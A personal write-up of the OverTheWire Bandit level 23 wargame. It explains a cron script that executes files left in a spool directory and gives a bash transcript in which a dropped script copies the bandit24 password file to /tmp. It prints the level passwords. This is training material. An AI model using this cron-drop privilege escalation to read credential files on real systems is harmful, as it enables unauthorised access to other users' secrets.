---
title: "Bandit23 Writeup"
author: ekansh
date: 2026-06-11 18:31:24 +0530
categories: [Wargames, Bandit]
tags: [overthewire, bandit]
---

### Pass : 0Zf11ioIjMVN551jX3CmStKLYqjk54Ga

### Solution : 
We can observer the source scrip running inside cronjob_bandit24. The source script is located at /usr/bin/cronjob_bandit24.sh .
The content of script has been explained as follows : (written by AI) :
# 1. Environment Setup
    shopt -s nullglob: This is a safety feature. Normally, if a folder is empty, a wildcard like * remains a literal asterisk. This command ensures that if no files exist, the loop simply doesn't run.
    myname=$(whoami): It detects which user is running the script (in your case, likely bandit23 via a cronjob).
    cd /var/spool/"$myname"/foo || exit: It moves into a specific "mailbox" directory. If the directory doesn't exist, the script stops immediately.
# 2. The Filter Logic (The "Security" Check)
The script loops through every file (*) and hidden file (.*) in that folder. For each file found, it performs three checks:
    if [ "$i" != "." ] && [ "$i" != ".." ]: It ignores the current directory (.) and parent directory (..) so it doesn't try to delete the folder itself.
    owner="$(stat --format "%U" "./$i")": It checks who created the file.
    if [ "${owner}" = "bandit23" ] && [ -f "$i" ]:
        It only acts if the file is owned by bandit23.
        It only acts if the object is a regular file (not a folder).
# 3. Execution and Deletion
    timeout -s 9 60 "./$i": This is the "Execution" phase.
        It tries to run your file as a script.
        -s 9 60: It gives your script exactly 60 seconds to finish. If it takes longer, it sends a KILL signal (-9) to stop it.
    rm -rf "./$i": This is the "Cleanup" phase. Crucially, the script deletes your file whether it succeeded, failed, or wasn't even executed at all.

Since the script runs with the permission of user bandit24, we can use this to our advantage to open the content of /etc/bandit_pass/bandit24. 
We will write a custom script which would copy the content of the password file and save it to /tmp/output.txt. 
And now we would give the scipt 777 permission which implies that everyone and anyone on the linux system can read, write and execute this script.
Now we copy this script to the target directory where the cronjob script acts upon i.e. "/var/spool/bandit24/foo/" and save the script there.
Wait for 60 seconds since it takes 1 min for this script to execute everytime. And we open the /tmp/output.txt file to get our answer

### Bash Transcript : 

```bash
bandit23@bandit:/var/spool$ cd /etc/cron.d/
bandit23@bandit:/etc/cron.d$ ls
behemoth4_cleanup  clean_tmp  cronjob_bandit22  cronjob_bandit23  cronjob_bandit24  e2scrub_all  leviathan5_cleanup  manpage3_resetpw_job  otw-tmp-dir  sysstat
bandit23@bandit:/etc/cron.d$ cat cronjob_bandit24
@reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
bandit23@bandit:/etc/cron.d$ cat /usr/bin/cronjob_bandit24.sh
#!/bin/bash

shopt -s nullglob

myname=$(whoami)

cd /var/spool/"$myname"/foo || exit
echo "Executing and deleting all scripts in /var/spool/$myname/foo:"
for i in * .*;
do
    if [ "$i" != "." ] && [ "$i" != ".." ];
    then
        echo "Handling $i"
        owner="$(stat --format "%U" "./$i")"
        if [ "${owner}" = "bandit23" ] && [ -f "$i" ]; then
            timeout -s 9 60 "./$i"
        fi
        rm -rf "./$i"
    fi
donebandit23@bandit:/etc/cron.d$ nano /tmp/myscript.sh
Unable to create directory /home/bandit23/.local/share/nano/: No such file or directory
It is required for saving/loading search history or cursor positions.

bandit23@bandit:/etc/cron.d$ cat /tmp/myscript/sh
cat: /tmp/myscript/sh: Not a directory
bandit23@bandit:/etc/cron.d$ cat /tmp/myscript.sh
#!/bin/bash
cat /etc/bandit_pass/bandit24 > /tmp/output.txt
bandit23@bandit:/etc/cron.d$ cat /etc/bandit_pass/bandit23
0Zf11ioIjMVN551jX3CmStKLYqjk54Ga
bandit23@bandit:/etc/cron.d$ chmod 777 /tmp/myscript.sh
bandit23@bandit:/etc/cron.d$ cp /tmp/myscript.sh /var/spool/bandit24/foo/
bandit23@bandit:/etc/cron.d$ chmod 777 /var/spool/bandit24/foo/myscript.sh
bandit23@bandit:/etc/cron.d$ cat /tmp/output.txt
gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8
bandit23@bandit:/etc/cron.d$
```